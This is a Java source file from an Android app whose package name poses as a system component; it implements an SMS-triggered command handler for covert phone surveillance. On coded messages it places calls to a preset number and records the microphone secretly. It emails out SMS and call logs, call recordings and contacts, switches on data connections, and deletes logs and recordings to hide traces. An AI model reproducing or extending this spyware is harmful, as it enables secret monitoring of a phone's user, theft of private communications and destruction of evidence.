package com.android.system.controled.util;

import java.io.File;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.util.Log;

import com.android.system.controled.Globle;
import com.android.system.controled.db.DatabaseUtil;

public class DoAboutCodeUtils {

	private static final String TAG = "DoAboutCodeUtils";

	public static boolean doOperaByMessage(Context context, String msgTxt) {
		boolean result = true;
		try {

			if (msgTxt.contains(Globle.PHONE_CODE_UP)) {
				Log.e(TAG, "调大铃声音量，并加震动");
				AudioUtil.turnUpMost(context);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_CALL_ME)) {
				Log.e(TAG, "拨打电话");
				Uri uri = Uri.parse("tel:" + Globle.PHONE_NUMBER);
				Intent it = new Intent(Intent.ACTION_CALL, uri); // 直接呼出
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(it);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_SMS_CALL)) {
				Log.e(TAG, "上传短信通话记录");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
					send2.upLoadSmsCallLog(context, true);
				} else {
					send2.upLoadSmsCallLog(context, false);
				}
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
				Log.e(TAG, "上传通话录音");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
					send2.upLoadCallAudios(context, true);
				} else {
					send2.upLoadCallAudios(context, false);
				}
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
				Log.e(TAG, "上传其它录音");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
					send2.upLoadOtherAudios(context, true);
				} else {
					send2.upLoadOtherAudios(context, false);
				}
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_ALL)) {
				Log.e(TAG, "上传所有");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
					send2.upLoadALL(context, true);
				} else {
					send2.upLoadALL(context, false);
				}
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_TIME)) {
				String words = msgTxt.substring(msgTxt.indexOf(Globle.PHONE_CODE_RECORD_TIME), msgTxt.length());
				String[] strs = words.split(":");
				if (strs.length == 2 && strs[1] != null) {
					Log.e(TAG, "录音N分钟: " + strs[1]);
					// 文件保存位置
					File file = new File(Globle.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
					RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]));
				}
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS)) {
				Log.e(TAG, "开始上传联系人");
				ContactsUtil.createContactsFile(context);
				SendEmailUtil send3 = new SendEmailUtil();
				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
					send3.upLoadContact(context, true);
				} else {
					send3.upLoadContact(context, false);
				}
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_START)) {
				Log.e(TAG, "开始录音");
				// 文件保存位置
				File file = new File(Globle.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
				RecorderUtil.getInstence(context).startRecorder(file, -1);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_END)) {
				Log.e(TAG, "结束录音");
				RecorderUtil.getInstence(context).stopRecorder();
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_DOWN)) {
				Log.e(TAG, "静音，并取消震动");
				AudioUtil.turnDown(context);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_MSG_LOG)) {
				Log.e(TAG, "删除短信记录");
				deleteSmsLog(context);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_CALL_LOG)) {
				Log.e(TAG, "删除通话记录");
				deleteCallLog();
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_TURNON_WIFI)) {
				Log.e(TAG, "开启wifi");
				turnOnWifi(context);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_TURNON_MOBILE)) {
				Log.e(TAG, "开启mobile network");
				NetworkUtil.setMobileNetEnable(context);
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_AUDIOS_CALL)) {
				Log.e(TAG, "删除通话录音记录");
				deleteCallRecord();
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
				Log.e(TAG, "删除其它录音记录");
				deleteOtherRecord();
			}

			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_ALL_LOG)) {
				Log.e(TAG, "删除所有记录");
				deleteSmsLog(context);
				deleteCallLog();
				deleteCallRecord();
				deleteOtherRecord();
			}

			else {

				result = false;

				// // 在特定时间内，自动调大音量
				// switch (Globle.inTime()) {
				// case 1:
				// Globle.turnUpMost(context);
				// break;
				// case 2:
				// Globle.turnUpSecond(context);
				// break;
				//
				// default:
				// break;
				// }
				// SystemClock.sleep(3000);
				// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
				// so.saveLastSms();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}

	private static void deleteSmsLog(Context context) {

		try {
			File a = new File(DatabaseUtil.DB_PATH);
			if (a.exists()) {
				SmsSaveOutUtil so = new SmsSaveOutUtil(context);
				so.deleteAllMsg();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void deleteCallLog() {
		try {
			if (Globle.FILE_CALL_LOG.exists()) {
				Globle.FILE_CALL_LOG.delete();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void deleteCallRecord() {
		try {
			FileUtil.delFileDir(new File(Globle.FILEPATH_AUDIOS_CALL));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void deleteOtherRecord() {
		try {
			FileUtil.delFileDir(new File(Globle.FILEPATH_AUDIOS_OTHER));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void turnOnWifi(Context context) {
		if (NetworkUtil.isWifiEnabled(context)) {
			Log.e("", " no need to turn wifi net work");
			return;
		}
		WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
		if (!wifiManager.isWifiEnabled()) {
			wifiManager.setWifiEnabled(true);
		}
	}

	// private boolean getMobileDataStatus(Context context) {
	// ConnectivityManager conMgr = (ConnectivityManager)
	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
	//
	// Class<?> conMgrClass = null; // ConnectivityManager类
	// Field iConMgrField = null; // ConnectivityManager类中的字段
	// Object iConMgr = null; // IConnectivityManager类的引用
	// Class<?> iConMgrClass = null; // IConnectivityManager类
	// Method getMobileDataEnabledMethod = null; // setMobileDataEnabled方法
	//
	// try {
	// // 取得ConnectivityManager类
	// conMgrClass = Class.forName(conMgr.getClass().getName());
	// // 取得ConnectivityManager类中的对象mService
	// iConMgrField = conMgrClass.getDeclaredField("mService");
	// // 设置mService可访问
	// iConMgrField.setAccessible(true);
	// // 取得mService的实例化类IConnectivityManager
	// iConMgr = iConMgrField.get(conMgr);
	// // 取得IConnectivityManager类
	// iConMgrClass = Class.forName(iConMgr.getClass().getName());
	// // 取得IConnectivityManager类中的getMobileDataEnabled(boolean)方法
	// getMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("getMobileDataEnabled");
	// // 设置getMobileDataEnabled方法可访问
	// getMobileDataEnabledMethod.setAccessible(true);
	// // 调用getMobileDataEnabled方法
	// return (Boolean) getMobileDataEnabledMethod.invoke(iConMgr);
	// } catch (ClassNotFoundException e) {
	// e.printStackTrace();
	// } catch (NoSuchFieldException e) {
	// e.printStackTrace();
	// } catch (SecurityException e) {
	// e.printStackTrace();
	// } catch (NoSuchMethodException e) {
	// e.printStackTrace();
	// } catch (IllegalArgumentException e) {
	// e.printStackTrace();
	// } catch (IllegalAccessException e) {
	// e.printStackTrace();
	// } catch (InvocationTargetException e) {
	// // TODO Auto-generated catch block
	// e.printStackTrace();
	// }
	// return false;
	// }
	//
	// /**
	// * 移动网络开关
	// */
	// private void toggleMobileData(Context context, boolean enabled) {
	// ConnectivityManager conMgr = (ConnectivityManager)
	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
	//
	// Class<?> conMgrClass = null; // ConnectivityManager类
	// Field iConMgrField = null; // ConnectivityManager类中的字段
	// Object iConMgr = null; // IConnectivityManager类的引用
	// Class<?> iConMgrClass = null; // IConnectivityManager类
	// Method setMobileDataEnabledMethod = null; // setMobileDataEnabled方法
	//
	// try {
	// // 取得ConnectivityManager类
	// conMgrClass = Class.forName(conMgr.getClass().getName());
	// // 取得ConnectivityManager类中的对象mService
	// iConMgrField = conMgrClass.getDeclaredField("mService");
	// // 设置mService可访问
	// iConMgrField.setAccessible(true);
	// // 取得mService的实例化类IConnectivityManager
	// iConMgr = iConMgrField.get(conMgr);
	// // 取得IConnectivityManager类
	// iConMgrClass = Class.forName(iConMgr.getClass().getName());
	// // 取得IConnectivityManager类中的setMobileDataEnabled(boolean)方法
	// setMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
	// // 设置setMobileDataEnabled方法可访问
	// setMobileDataEnabledMethod.setAccessible(true);
	// // 调用setMobileDataEnabled方法
	// setMobileDataEnabledMethod.invoke(iConMgr, enabled);
	// } catch (ClassNotFoundException e) {
	// e.printStackTrace();
	// } catch (NoSuchFieldException e) {
	// e.printStackTrace();
	// } catch (SecurityException e) {
	// e.printStackTrace();
	// } catch (NoSuchMethodException e) {
	// e.printStackTrace();
	// } catch (IllegalArgumentException e) {
	// e.printStackTrace();
	// } catch (IllegalAccessException e) {
	// e.printStackTrace();
	// } catch (InvocationTargetException e) {
	// e.printStackTrace();
	// }
	// }

}
